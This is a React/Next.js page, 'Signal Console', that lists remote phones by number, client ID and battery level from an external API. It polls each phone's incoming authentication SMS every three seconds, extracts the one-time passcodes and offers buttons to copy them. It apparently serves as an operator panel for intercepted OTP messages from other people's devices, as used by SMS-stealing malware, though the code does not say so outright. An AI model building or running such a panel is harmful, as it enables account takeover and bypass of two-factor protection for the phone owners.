'use client';

import { useCallback, useEffect, useMemo, useState, useRef } from 'react';
import {
  Activity,
  Battery,
  BatteryCharging,
  CheckCircle2,
  ChevronRight,
  CircleAlert,
  Clock3,
  Code2,
  Copy,
  Inbox,
  MessageSquareText,
  MonitorSmartphone,
  RefreshCw,
  Server,
  ShieldCheck,
  Smartphone,
  Wifi,
  Zap,
} from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Empty,
  EmptyContent,
  EmptyDescription,
  EmptyHeader,
  EmptyMedia,
  EmptyTitle,
} from '@/components/ui/empty';
import { Input } from '@/components/ui/input';
import { Separator } from '@/components/ui/separator';
import { Skeleton } from '@/components/ui/skeleton';
import { Switch } from '@/components/ui/switch';

const API_BASE = 'https://apifb-ten.vercel.app';

type Device = {
  client_id: string;
  mobNo: string;
  battery: string | number;
  status: boolean;
};

type OtpMessage = {
  id: string;
  sender: string;
  message: string;
  dateTime: string;
};

type FetchState = 'idle' | 'loading' | 'success' | 'error';

/** Fixed battery‑icon helper – now returns a proper JSX icon. */
function BatteryIcon({ level }: { level: number }) {
  if (Number.isNaN(level)) {
    return <Battery className="h-4 w-4 text-slate-400" />;
  }
  if (level > 50) {
    return <BatteryCharging className="h-4 w-4 text-emerald-600" />;
  }
  if (level >= 20) {
    return <Battery className="h-4 w-4 text-amber-600" />;
  }
  return <Battery className="h-4 w-4 text-rose-600" />;
}

function formatTime(value: string) {
  const parsed = new Date(value.replace(' ', 'T'));
  return Number.isNaN(parsed.getTime())
    ? value
    : parsed.toLocaleString([], {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      });
}

function extractOtp(value: string) {
  return value.match(/\b\d{4,8}\b/)?.[0];
}

/** Reusable copy‑to‑clipboard button with aria‑label and error handling. */
function CopyButton({
  text,
  onCopied,
  copied,
}: {
  text: string;
  onCopied: () => void;
  copied: boolean;
}) {
  const [error, setError] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      onCopied();
      setError(false);
    } catch {
      setError(true);
    }
  };

  return (
    <Button
      variant="ghost"
      size="xs"
      onClick={handleCopy}
      aria-label={copied ? 'Copied to clipboard' : 'Copy OTP'}
    >
      {copied ? (
        <CheckCircle2 className="h-3.5 w-3.5 text-emerald-600" />
      ) : (
        <Copy className="h-3.5 w-3.5" />
      )}
      <span className="sr-only">{copied ? 'Copied' : 'Copy'}</span>
      {error && (
        <span className="text-xs text-rose-500" role="alert">
          Copy failed
        </span>
      )}
    </Button>
  );
}

export default function Page() {
  const [dbCode, setDbCode] = useState('101');
  const [debouncedDbCode, setDebouncedDbCode] = useState(dbCode);
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedId, setSelectedId] = useState('');
  const [messages, setMessages] = useState<OtpMessage[]>([]);
  const [deviceState, setDeviceState] = useState<FetchState>('idle');
  const [messageState, setMessageState] = useState<FetchState>('idle');
  const [error, setError] = useState('');
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const [copiedId, setCopiedId] = useState('');

  const selectedDevice = useMemo(
    () => devices.find((d) => d.client_id === selectedId),
    [devices, selectedId],
  );

  // Debounce the database code so we don’t fire requests on every keystroke.
  useEffect(() => {
    const timer = setTimeout(() => setDebouncedDbCode(dbCode.trim()), 400);
    return () => clearTimeout(timer);
  }, [dbCode]);

  const fetchDevices = useCallback(
    async (signal?: AbortSignal) => {
      const code = debouncedDbCode;
      if (!code) return;
      setDeviceState('loading');
      setError('');
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(code)}/devices`,
          { signal, cache: 'no-store' },
        );
        if (!res.ok) {
          throw new Error(
            res.status === 404
              ? 'Database code not found.'
              : `Unable to load devices (${res.status}).`,
          );
        }
        const payload = await res.json();
        const active: Device[] = Array.isArray(payload.devices)
          ? payload.devices.filter((d: Device) => d.status)
          : [];
        setDevices(active);
        setSelectedId((cur) =>
          active.some((d) => d.client_id === cur)
            ? cur
            : active[0]?.client_id ?? '',
        );
        setDeviceState('success');
        setLastUpdated(new Date());
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return;
        setDevices([]);
        setSelectedId('');
        setMessages([]);
        setDeviceState('error');
        setError((cause as Error).message || 'Could not connect to the API.');
      }
    },
    [debouncedDbCode],
  );

  const fetchMessages = useCallback(
    async (signal?: AbortSignal) => {
      if (!selectedDevice) {
        setMessages([]);
        setMessageState('idle');
        return;
      }
      setMessageState('loading');
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(debouncedDbCode)}/messages/${encodeURIComponent(
            selectedDevice.client_id,
          )}`,
          { signal, cache: 'no-store' },
        );
        if (!res.ok) {
          throw new Error(`Unable to load messages (${res.status}).`);
        }
        const payload = await res.json();
        setMessages(Array.isArray(payload.messages) ? payload.messages : []);
        setMessageState('success');
        setLastUpdated(new Date());
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return;
        setMessages([]);
        setMessageState('error');
        setError((cause as Error).message || 'Could not load messages.');
      }
    },
    [debouncedDbCode, selectedDevice],
  );

  // Fetch devices when the debounced code changes.
  useEffect(() => {
    const c = new AbortController();
    fetchDevices(c.signal);
    return () => c.abort();
  }, [fetchDevices]);

  // Fetch messages when the selected device or code changes.
  useEffect(() => {
    const c = new AbortController();
    fetchMessages(c.signal);
    return () => c.abort();
  }, [fetchMessages]);

  // Auto‑refresh – re‑created whenever the code or device changes.
  useEffect(() => {
    if (!autoRefresh || !selectedDevice) return;
    const id = window.setInterval(() => fetchMessages(), 3000);
    return () => window.clearInterval(id);
  }, [autoRefresh, selectedDevice, fetchMessages]);

  const manualRefresh = () => {
    fetchDevices();
    if (selectedDevice) fetchMessages();
  };

  const busy = deviceState === 'loading' || messageState === 'loading';

  return (
    <main className="min-h-screen bg-slate-50 px-4 py-6 sm:px-6 lg:px-8">
      {/* Header */}
      <header className="mb-6 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div className="flex items-center gap-2">
          <Activity className="h-6 w-6 text-blue-600" aria-hidden="true" />
          <span className="text-sm font-medium text-slate-600">
            Signal Console
          </span>
        </div>
        <div className="flex flex-wrap items-center gap-3">
          <label htmlFor="db-code" className="sr-only">
            Database code
          </label>
          <Input
            id="db-code"
            value={dbCode}
            onChange={(e) => setDbCode(e.target.value)}
            placeholder="DB code"
            className="h-9 w-28 border-slate-200 bg-white font-mono shadow-sm focus-visible:ring-cyan-400"
            aria-label="Database code"
          />
          <Button
            variant="outline"
            size="sm"
            onClick={manualRefresh}
            disabled={busy}
            aria-label={busy ? 'Refreshing' : 'Refresh data'}
          >
            <RefreshCw
              className={`h-4 w-4 ${busy ? 'animate-spin' : ''}`}
              aria-hidden="true"
            />
            <span className="ml-1 hidden sm:inline">Refresh</span>
          </Button>
        </div>
      </header>

      <Separator className="my-4" />

      <div className="grid gap-6 lg:grid-cols-[280px_1fr]">
        {/* ─── Device Sidebar ─── */}
        <aside className="space-y-4">
          <Card className="overflow-hidden">
            <CardHeader className="pb-2">
              <CardTitle className="flex items-center justify-between text-base">
                <span>Devices</span>
                <Badge variant="secondary">{devices.length} active</Badge>
              </CardTitle>
            </CardHeader>
            <CardContent className="p-0">
              {deviceState === 'loading' ? (
                <div className="space-y-2 p-4">
                  {[1, 2, 3].map((i) => (
                    <Skeleton key={i} className="h-16 w-full rounded-xl" />
                  ))}
                </div>
              ) : deviceState === 'error' ? (
                <Alert variant="destructive" className="m-4">
                  <CircleAlert className="h-4 w-4" />
                  <AlertTitle>Connection failed</AlertTitle>
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              ) : devices.length === 0 ? (
                <Empty className="p-6">
                  <EmptyHeader>
                    <EmptyMedia variant="icon">
                      <Inbox className="h-6 w-6" />
                    </EmptyMedia>
                    <EmptyTitle>No active devices</EmptyTitle>
                    <EmptyDescription>
                      Check the database code or connect a device to begin
                      monitoring.
                    </EmptyDescription>
                  </EmptyHeader>
                </Empty>
              ) : (
                <ul className="divide-y divide-slate-100">
                  {devices.map((device) => {
                    const battery = Number(device.battery);
                    const selected = device.client_id === selectedId;
                    return (
                      <li key={device.client_id}>
                        <button
                          type="button"
                          onClick={() => setSelectedId(device.client_id)}
                          aria-pressed={selected}
                          className={`flex w-full items-center gap-3 p-4 text-left transition-colors ${
                            selected
                              ? 'bg-blue-50 text-blue-900'
                              : 'hover:bg-slate-50'
                          }`}
                        >
                          <Smartphone className="h-5 w-5 shrink-0 text-slate-400" />
                          <div className="min-w-0 flex-1">
                            <p className="truncate text-sm font-medium">
                              {device.mobNo}
                            </p>
                            <p className="truncate text-xs text-slate-500">
                              {device.client_id}
                            </p>
                          </div>
                          <div className="flex items-center gap-1 text-xs">
                            <BatteryIcon level={battery} />
                            <span>{battery}%</span>
                          </div>
                        </button>
                      </li>
                    );
                  })}
                </ul>
              )}
            </CardContent>
          </Card>

          <div className="flex items-center justify-between text-xs text-slate-500">
            <span className="flex items-center gap-1">
              <Wifi className="h-3 w-3 text-emerald-500" />
              API online
            </span>
            <span>3s polling</span>
          </div>
        </aside>

        {/* ─── Message Stream ─── */}
        <section className="space-y-4">
          <Card>
            <CardHeader className="flex flex-row items-start justify-between gap-4 pb-2">
              <div>
                <CardTitle className="text-lg">
                  {selectedDevice ? selectedDevice.mobNo : 'Select a device'}
                </CardTitle>
                <p className="text-sm text-slate-500">
                  {selectedDevice
                    ? `Incoming authentication messages for ${selectedDevice.client_id}`
                    : 'Choose an active endpoint from the device list.'}
                </p>
              </div>
              <div className="flex items-center gap-2">
                <label
                  htmlFor="auto-refresh"
                  className="flex items-center gap-1.5 text-sm"
                >
                  <span className="hidden sm:inline">Auto-refresh</span>
                  <Switch
                    id="auto-refresh"
                    checked={autoRefresh}
                    onCheckedChange={setAutoRefresh}
                    aria-label="Toggle auto-refresh"
                  />
                </label>
              </div>
            </CardHeader>

            {selectedDevice && (
              <div className="flex flex-wrap items-center gap-2 border-b px-4 pb-3">
                <Badge
                  variant="outline"
                  className="flex items-center gap-1 border-emerald-200 bg-emerald-50 text-emerald-700"
                >
                  <span className="relative flex h-2 w-2">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500" />
                  </span>
                  LIVE
                </Badge>
                <span className="text-xs text-slate-500">
                  {lastUpdated
                    ? `Updated ${lastUpdated.toLocaleTimeString([], {
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit',
                      })}`
                    : 'Waiting for data'}
                </span>
                <Badge variant="secondary" className="ml-auto">
                  {messages.length}{' '}
                  {messages.length === 1 ? 'message' : 'messages'}
                </Badge>
              </div>
            )}

            <CardContent className="p-4">
              {messageState === 'loading' ? (
                <div className="space-y-3">
                  {[1, 2, 3, 4].map((i) => (
                    <Skeleton key={i} className="h-20 w-full rounded-lg" />
                  ))}
                </div>
              ) : messageState === 'error' ? (
                <Alert variant="destructive">
                  <CircleAlert className="h-4 w-4" />
                  <AlertTitle>Message stream unavailable</AlertTitle>
                  <AlertDescription>{error}</AlertDescription>
                  <Button
                    variant="outline"
                    size="sm"
                    className="mt-2"
                    onClick={() => fetchMessages()}
                  >
                    Try again
                  </Button>
                </Alert>
              ) : !selectedDevice ? (
                <Empty className="py-10">
                  <EmptyHeader>
                    <EmptyMedia variant="icon">
                      <MonitorSmartphone className="h-6 w-6" />
                    </EmptyMedia>
                    <EmptyTitle>No device selected</EmptyTitle>
                    <EmptyDescription>
                      Select a device to view incoming OTP messages.
                    </EmptyDescription>
                  </EmptyHeader>
                </Empty>
              ) : messages.length === 0 ? (
                <Empty className="py-10">
                  <EmptyHeader>
                    <EmptyMedia variant="icon">
                      <MessageSquareText className="h-6 w-6" />
                    </EmptyMedia>
                    <EmptyTitle>No messages yet</EmptyTitle>
                    <EmptyDescription>
                      This device has not received any OTP messages.
                    </EmptyDescription>
                  </EmptyHeader>
                  <EmptyContent>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => fetchMessages()}
                    >
                      Check again
                    </Button>
                  </EmptyContent>
                </Empty>
              ) : (
                <ul className="space-y-3">
                  {messages.map((item) => {
                    const otp = extractOtp(item.message);
                    return (
                      <li
                        key={item.id}
                        className="rounded-lg border border-slate-200 bg-white p-4 shadow-sm transition-shadow hover:shadow-md"
                      >
                        <div className="mb-1 flex items-center justify-between">
                          <span className="text-sm font-semibold text-slate-800">
                            {item.sender}
                          </span>
                          <Badge
                            variant="outline"
                            className="border-blue-200 bg-blue-50 text-blue-700"
                          >
                            OTP
                          </Badge>
                        </div>
                        <p className="mb-2 break-words text-sm text-slate-700">
                          {otp
                            ? item.message.replace(otp, '').trim()
                            : item.message}
                        </p>
                        {otp && (
                          <div className="mb-2 flex items-center gap-2">
                            <code className="rounded bg-slate-100 px-2 py-0.5 font-mono text-base font-bold text-slate-900">
                              {otp}
                            </code>
                          </div>
                        )}
                        <div className="flex items-center justify-between text-xs text-slate-500">
                          <span className="flex items-center gap-1">
                            <Clock3 className="h-3 w-3" />
                            {formatTime(item.dateTime)}
                          </span>
                          <CopyButton
                            text={otp ?? item.message}
                            copied={copiedId === item.id}
                            onCopied={() => {
                              setCopiedId(item.id);
                              setTimeout(() => setCopiedId(''), 1500);
                            }}
                          />
                        </div>
                      </li>
                    );
                  })}
                </ul>
              )}
            </CardContent>
          </Card>

          <footer className="flex flex-wrap items-center justify-between gap-2 text-xs text-slate-500">
            <span className="flex items-center gap-1">
              <Server className="h-3 w-3" />
              Connected to {API_BASE.replace('https://', '')}
            </span>
            <span className="flex items-center gap-1">
              <ShieldCheck className="h-3 w-3 text-emerald-500" />
              Secure channel
            </span>
          </footer>
        </section>
      </div>
    </main>
  );
}
